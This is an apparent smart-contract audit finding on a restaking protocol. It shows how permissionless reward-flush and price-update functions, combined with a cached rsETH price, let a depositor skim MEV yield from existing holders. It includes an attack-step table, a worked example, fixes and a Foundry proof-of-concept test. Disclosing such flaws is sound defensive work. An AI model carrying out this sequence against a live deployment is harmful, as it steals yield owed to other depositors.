### Title
Permissionless `FeeReceiver.sendFunds()` + Stale rsETH Price Enables Yield Theft from Existing Holders — (`contracts/FeeReceiver.sol`)

---

### Summary

`FeeReceiver.sendFunds()` has no access control and can be called by anyone. Combined with the fact that `LRTOracle.rsETHPrice` is a **cached/stale value** (not computed on-the-fly) and `LRTOracle.updateRSETHPrice()` is also permissionless, an attacker can deposit ETH at an artificially low rsETH price, then atomically flush the FeeReceiver balance into the deposit pool and trigger a price update — capturing a disproportionate share of MEV/execution-layer rewards that rightfully belong to pre-existing rsETH holders.

---

### Finding Description

**Root cause 1 — FeeReceiver ETH is intentionally excluded from TVL:**

`getETHDistributionData()` only reads `address(this).balance` of the deposit pool, NDCs, unstaking vault, and converter. The FeeReceiver address is never queried. [1](#0-0) 

The comment at line 465–466 confirms this is by design: rewards are excluded until `sendFunds()` moves them.

**Root cause 2 — `sendFunds()` has no access control:**

```solidity
function sendFunds() external {          // ← no role check
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
``` [2](#0-1) 

Any EOA or contract can call this at any time.

**Root cause 3 — rsETH price is a stale cached value, and `updateRSETHPrice()` is permissionless:**

Deposits use `lrtOracle.rsETHPrice()`, which is a storage variable last written by a prior `updateRSETHPrice()` call — not the live TVL. [3](#0-2) 

`updateRSETHPrice()` carries only a `whenNotPaused` guard — no role restriction: [4](#0-3) 

**Attack sequence (single transaction or two sequential txs):**

| Step | Action | Effect |
|------|--------|--------|
| 1 | FeeReceiver accumulates N ETH of MEV rewards | TVL understated by N ETH; rsETH price stale |
| 2 | Attacker calls `depositETH{value: X}(...)` | Attacker receives rsETH minted at the stale (low) price |
| 3 | Attacker calls `FeeReceiver.sendFunds()` | N ETH moves to deposit pool; TVL jumps by N ETH |
| 4 | Attacker calls `LRTOracle.updateRSETHPrice()` | Price recalculated over larger TVL; rsETH price rises |
| 5 | Attacker redeems/holds rsETH | Attacker's rsETH is worth more than deposited |

**Numerical example:**
- Protocol TVL: 1 000 ETH, rsETH supply: 1 000 → price = 1.000 ETH/rsETH
- FeeReceiver holds 100 ETH (excluded from TVL)
- Attacker deposits 10 ETH → receives 10 rsETH at price 1.000
- Attacker calls `sendFunds()` → 100 ETH enters deposit pool
- TVL = 1 000 + 10 + 100 = 1 110 ETH, supply = 1 010 rsETH
- `updateRSETHPrice()` → new price ≈ 1.099 ETH/rsETH (ignoring protocol fee)
- Attacker's 10 rsETH ≈ 10.99 ETH → **~0.99 ETH profit**
- Pre-existing 1 000 rsETH holders receive 1 099 ETH instead of 1 100 ETH → **~1 ETH stolen**

---

### Impact Explanation

Pre-existing rsETH holders earned the MEV/execution-layer rewards sitting in FeeReceiver. By front-running the `sendFunds()` call with a deposit at the stale price, an attacker dilutes their yield share. This is a direct, quantifiable theft of unclaimed yield proportional to the FeeReceiver balance and the attacker's deposit size.

**Scope match:** High — Theft of unclaimed yield.

---

### Likelihood Explanation

- Both `FeeReceiver.sendFunds()` and `LRTOracle.updateRSETHPrice()` are permissionless public functions.
- FeeReceiver accumulates MEV rewards continuously between `sendFunds()` calls; the window is always open.
- No special privileges, no oracle manipulation, no governance capture required.
- The `pricePercentageLimit` check [5](#0-4) 
  is a partial mitigation: if the price jump exceeds the configured threshold, `updateRSETHPrice()` reverts for non-managers. However: (a) if `pricePercentageLimit == 0` (disabled), there is no protection at all; (b) if the FeeReceiver balance is small enough relative to TVL to stay within the threshold, the attack succeeds silently; (c) an attacker can split the operation across multiple blocks to stay under the threshold each time.

Likelihood: **High** when `pricePercentageLimit` is 0 or when FeeReceiver balance is within the threshold.

---

### Recommendation

1. **Restrict `sendFunds()`** to a privileged role (e.g., `MANAGER` or `LRT_OPERATOR`) so that only authorized parties can flush rewards into the deposit pool.
2. **Alternatively, include FeeReceiver balance in TVL** inside `getETHDistributionData()` so the rsETH price already reflects pending rewards and there is no exploitable gap.
3. **Atomically update the price** inside `receiveFromRewardReceiver()` (or require `updateRSETHPrice()` to be called before any deposit in the same block after a `sendFunds()` call).

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Foundry fork test (local fork, no mainnet)
import "forge-std/Test.sol";
import "../contracts/FeeReceiver.sol";
import "../contracts/LRTOracle.sol";
import "../contracts/LRTDepositPool.sol";
import "../contracts/interfaces/IRSETH.sol";

contract YieldTheftPoC is Test {
    LRTDepositPool depositPool;
    LRTOracle      oracle;
    FeeReceiver    feeReceiver;
    IRSETH         rsETH;

    address attacker = address(0xBEEF);

    function setUp() public {
        // ... deploy/configure protocol with existing 1000 ETH TVL, 1000 rsETH supply
        // ... fund FeeReceiver with 100 ETH simulating accumulated MEV rewards
    }

    function testYieldTheft() public {
        // 1. Record price before attack
        uint256 priceBefore = oracle.rsETHPrice();
        // priceBefore ≈ 1.000e18 (FeeReceiver 100 ETH excluded)

        // 2. Attacker deposits 10 ETH at stale (understated) price
        vm.deal(attacker, 10 ether);
        vm.prank(attacker);
        depositPool.depositETH{value: 10 ether}(0, "");
        uint256 attackerRsETH = rsETH.balanceOf(attacker);
        // attackerRsETH ≈ 10e18 (minted at price 1.000)

        // 3. Attacker flushes FeeReceiver (permissionless)
        vm.prank(attacker);
        feeReceiver.sendFunds();

        // 4. Attacker triggers price update (permissionless)
        vm.prank(attacker);
        oracle.updateRSETHPrice();

        uint256 priceAfter = oracle.rsETHPrice();
        // priceAfter ≈ 1.099e18

        // 5. Assert price increased
        assertGt(priceAfter, priceBefore, "price must have risen");

        // 6. Assert attacker's rsETH is worth more than deposited
        uint256 attackerETHValue = attackerRsETH * priceAfter / 1e18;
        assertGt(attackerETHValue, 10 ether, "attacker profited from yield theft");
    }
}
```

**Key references:**
- `FeeReceiver.sendFunds()` — no access control: [2](#0-1) 
- `LRTOracle.updateRSETHPrice()` — no role guard: [4](#0-3) 
- `getETHDistributionData()` — FeeReceiver excluded from TVL: [6](#0-5) 
- `getRsETHAmountToMint()` — uses stale cached price: [3](#0-2) 
- `_updateRsETHPrice()` — price recomputed from live TVL on demand: [7](#0-6)

### Citations

**File:** contracts/LRTDepositPool.sol (L464-500)
```text
    /// @dev provides ETH amount distribution data among depositPool, NDCs and eigenLayer
    /// @dev rewards are not accounted here
    /// it will automatically be accounted once it is moved from feeReceiver/rewardReceiver to depositPool
    function getETHDistributionData()
        public
        view
        override
        returns (
            uint256 ethLyingInDepositPool,
            uint256 ethLyingInNDCs,
            uint256 ethStakedInEigenLayer,
            uint256 ethUnstakingFromEigenLayer,
            uint256 ethLyingInConverter,
            uint256 ethLyingInUnstakingVault
        )
    {
        ethLyingInDepositPool = address(this).balance;

        uint256 ndcsCount = nodeDelegatorQueue.length;

        for (uint256 i; i < ndcsCount;) {
            ethLyingInNDCs += nodeDelegatorQueue[i].balance;

            ethStakedInEigenLayer += INodeDelegator(nodeDelegatorQueue[i]).getEffectivePodShares();
            ethUnstakingFromEigenLayer += INodeDelegator(nodeDelegatorQueue[i])
                .getAssetUnstaking(LRTConstants.ETH_TOKEN);
            unchecked {
                ++i;
            }
        }

        address lrtUnstakingVault = lrtConfig.getContract(LRTConstants.LRT_UNSTAKING_VAULT);
        ethLyingInUnstakingVault = lrtUnstakingVault.balance;

        address lrtConverter = lrtConfig.getContract(LRTConstants.LRT_CONVERTER);
        ethLyingInConverter = ILRTConverter(lrtConverter).ethValueInWithdrawal();
    }
```

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/FeeReceiver.sol (L53-58)
```text
    function sendFunds() external {
        uint256 balance = address(this).balance;
        ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();

        emit MevRewardsAddedToTVL(balance);
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L231-250)
```text
        uint256 totalETHInProtocol = _getTotalEthInProtocol();

        // calculate previousTVL using rsethSupply multiplied by rsETHPrice
        uint256 previousTVL = rsethSupply.mulWad(rsETHPrice);

        IPausable lrtDepositPool = IPausable(lrtConfig.getContract(LRTConstants.LRT_DEPOSIT_POOL));
        IPausable withdrawalManager = IPausable(lrtConfig.getContract(LRTConstants.LRT_WITHDRAW_MANAGER));

        // determine if the protocol is active (not paused)
        bool protocolPaused = lrtDepositPool.paused() || withdrawalManager.paused() || paused;

        // only take fee if TVL increased and protocol is not paused
        uint256 protocolFeeInETH = 0;
        if (!protocolPaused && totalETHInProtocol > previousTVL) {
            uint256 rewardAmount = totalETHInProtocol - previousTVL;
            protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
        }

        // compute new rsETH price based on total ETH minus fee
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

**File:** contracts/LRTOracle.sol (L252-266)
```text
        if (newRsETHPrice > highestRsethPrice) {
            // check if the price is above the threshold
            uint256 priceDifference = newRsETHPrice - highestRsethPrice;
            // pricePercentageLimit is in 1e18 precision (100% = 1e18, 1% = 1e16)
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
```
